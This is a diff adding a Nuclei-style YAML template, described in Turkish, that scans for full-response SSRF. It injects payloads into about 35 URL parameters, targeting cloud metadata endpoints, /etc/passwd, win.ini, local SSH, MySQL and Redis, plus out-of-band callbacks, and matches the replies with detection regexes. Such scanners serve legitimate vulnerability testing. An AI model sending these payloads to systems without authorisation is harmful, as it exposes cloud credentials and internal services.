@@ -1,0 +1,133 @@
+id: response-ssrf
+
+info:
+  name: Full Response SSRF Detection
+  author: pdteam,pwnhxl,j4vaovo,AmirHossein Raeisi
+  severity: high
+  reference:
+    - https://github.com/bugcrowd/HUNT/blob/master/ZAP/scripts/passive/SSRF.py
+  description: |
+    Yaygın SSRF parametrelerine (url, uri, file, dest, redirect, host vb.) SSRF
+    yükleri enjekte ederek tam yanıt (in-band) SSRF ve dosya okuma zafiyetlerini
+    tespit eder. Bulut meta veri uç noktaları, /etc/passwd, iç servisler (Redis,
+    SSH, MySQL) ve OOB (interactsh) etkileşimi denenir. -dast bayrağı gerektirmez.
+  classification:
+    cwe-id: CWE-918
+  metadata:
+    max-request: 646
+  tags: ssrf,injection,disclosure
+
+http:
+  - method: GET
+    payloads:
+      ssrf:
+        - 'http://{{interactsh-url}}'
+        - 'http://{{FQDN}}.{{interactsh-url}}'
+        - 'http://{{FQDN}}@{{interactsh-url}}'
+        - 'http://{{interactsh-url}}#{{FQDN}}'
+        - 'http://{{RDN}}.{{interactsh-url}}'
+        - 'http://{{RDN}}@{{interactsh-url}}'
+        - 'http://{{interactsh-url}}#{{RDN}}'
+        - 'file:////./etc/./passwd'
+        - 'file:///c:/./windows/./win.ini'
+        - 'http://metadata.tencentyun.com/latest/meta-data/'
+        - 'http://100.100.100.200/latest/meta-data/'
+        - 'http://169.254.169.254/latest/meta-data/'
+        - 'http://169.254.169.254/metadata/v1'
+        - 'http://metadata.google.internal/computeMetadata/v1/'
+        - 'http://127.0.0.1:22'
+        - 'http://127.0.0.1:3306'
+        - 'dict://127.0.0.1:6379/info'
+    attack: batteringram
+    path:
+      - "{{BaseURL}}?url={{ssrf}}"
+      - "{{BaseURL}}?uri={{ssrf}}"
+      - "{{BaseURL}}?path={{ssrf}}"
+      - "{{BaseURL}}?file={{ssrf}}"
+      - "{{BaseURL}}?dest={{ssrf}}"
+      - "{{BaseURL}}?redirect={{ssrf}}"
+      - "{{BaseURL}}?page={{ssrf}}"
+      - "{{BaseURL}}?host={{ssrf}}"
+      - "{{BaseURL}}?domain={{ssrf}}"
+      - "{{BaseURL}}?callback={{ssrf}}"
+      - "{{BaseURL}}?feed={{ssrf}}"
+      - "{{BaseURL}}?site={{ssrf}}"
+      - "{{BaseURL}}?out={{ssrf}}"
+      - "{{BaseURL}}?view={{ssrf}}"
+      - "{{BaseURL}}?data={{ssrf}}"
+      - "{{BaseURL}}?imgurl={{ssrf}}"
+      - "{{BaseURL}}?image={{ssrf}}"
+      - "{{BaseURL}}?continue={{ssrf}}"
+      - "{{BaseURL}}?next={{ssrf}}"
+      - "{{BaseURL}}?to={{ssrf}}"
+      - "{{BaseURL}}?reference={{ssrf}}"
+      - "{{BaseURL}}?redirect_uri={{ssrf}}"
+      - "{{BaseURL}}?return={{ssrf}}"
+      - "{{BaseURL}}?u={{ssrf}}"
+      - "{{BaseURL}}?link={{ssrf}}"
+      - "{{BaseURL}}?proxy={{ssrf}}"
+      - "{{BaseURL}}?fetch={{ssrf}}"
+      - "{{BaseURL}}?resource={{ssrf}}"
+      - "{{BaseURL}}?load={{ssrf}}"
+      - "{{BaseURL}}?src={{ssrf}}"
+      - "{{BaseURL}}?webhook={{ssrf}}"
+      # Türkçe parametre adları
+      - "{{BaseURL}}?adres={{ssrf}}"
+      - "{{BaseURL}}?baglanti={{ssrf}}"
+      - "{{BaseURL}}?kaynak={{ssrf}}"
+      - "{{BaseURL}}?yonlendir={{ssrf}}"
+
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+
+      - type: word
+        part: body
+        words:
+          - "Interactsh Server"
+
+      - type: regex
+        part: body
+        regex:
+          - 'SSH-(\d.\d)-OpenSSH_(\d.\d)'
+
+      - type: regex
+        part: body
+        regex:
+          - '(DENIED Redis|CONFIG REWRITE|NOAUTH Authentication)'
+
+      - type: regex
+        part: body
+        regex:
+          - '(\d.\d.\d)(.*?)mysql_native_password'
+
+      - type: regex
+        part: body
+        regex:
+          - 'root:.*?:[0-9]*:[0-9]*:'
+
+      - type: word
+        part: body
+        words:
+          - 'for 16-bit app support'
+
+      - type: regex
+        part: body
+        regex:
+          - 'dns-conf\/[\s\S]+instance\/'
+
+      - type: regex
+        part: body
+        regex:
+          - 'app-id[\s\S]+placement\/'
+
+      - type: regex
+        part: body
+        regex:
+          - 'ami-id[\s\S]+placement\/'
+
+      - type: regex
+        part: body
+        regex:
+          - 'id[\s\S]+interfaces\/'
+# digest: 4a0a0047304502207f56832537811f8d9f528fa5af83d562549394d54ea74bfc72bf2889fec20c51022100e697d5acec83a478cb8f60b02e1c90a45ba3575c99b879749d01ed38b8ea8c48:922c64590222798bb761d5b6d8e72950
